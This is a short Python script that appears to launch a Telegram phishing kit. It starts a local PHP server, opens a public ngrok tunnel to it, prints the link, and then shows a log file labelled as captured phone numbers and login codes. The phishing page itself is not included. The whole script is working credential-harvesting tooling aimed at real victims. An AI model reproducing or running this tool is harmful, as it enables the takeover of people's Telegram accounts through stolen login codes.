import os
from colorama import Fore
import time
from pyngrok import ngrok
from subprocess import Popen
print(Fore.CYAN)
os.system("clear")
print("""
                                           
 _____     __            _____ _____       
|_   _|___|  |   ___ ___| __  |  _  |_____ 
  | | | -_|  |__| -_| . |    -|     |     |
  |_| |___|_____|___|_  |__|__|__|__|_|_|_|
                    |___|                  

__________________________________
+t.me/telegram+
+coding by mobin-Dan+
__________________________________

""")



re =input(Fore.RED+"[PORT]"+" =>")
with open("server","w") as phplog:
    Popen(("php","-S","localhost:"+re),stderr=phplog ,stdout=phplog)
print(Fore.GREEN)
link=ngrok.connect(re,"http")
print(link)
print(Fore.GREEN+"phone number && code => cat log.txt")
input("")
print(Fore.RED)
print("             PhoneNumber && code             ")
print(Fore.RED+"****@termux_learning*****"+Fore.GREEN+"******"+Fore.CYAN+"********")
os.system("cat log.txt")
print(Fore.RED+"***@termux_learning******"+Fore.GREEN+"******"+Fore.CYAN+"********")
